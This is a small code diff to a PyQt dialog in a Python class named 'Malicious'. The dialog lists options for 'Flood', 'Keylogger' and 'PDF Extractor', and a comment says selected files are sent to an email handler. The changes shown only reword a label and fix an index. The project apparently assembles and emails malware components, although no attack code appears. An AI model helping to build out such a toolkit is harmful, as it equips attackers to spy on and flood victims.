@@ -116,7 +116,7 @@ class Malicious(object):
         Dialog.setWindowIcon(QtGui.QIcon('python.png'))
         self.label.setText("Email ID:")
         self.email_Input.setText("example@example.com")
-        self.email_comboBox.setItemText(0, "Choose emails...")
+        self.email_comboBox.setItemText(0, "Choose from emails...")
         self.checkBox_flood.setText("Flood")
         self.checkBox_keylogger.setText("Keylogger")
         self.checkBox_pdf_ex.setText("PDF Extractor")
@@ -176,7 +176,7 @@ class Malicious(object):
     def selectOption(self, index):     
         file = open("info.txt", 'r')
         lines = file.readlines()
-        self.info_textarea.setText(lines[index-1])
+        self.info_textarea.setText(lines[index])
 
     #what happens when user ticks a checkbox with options - file names are added to list to be sent to email_handler.py
     def checkBoxSelected(self, cb):
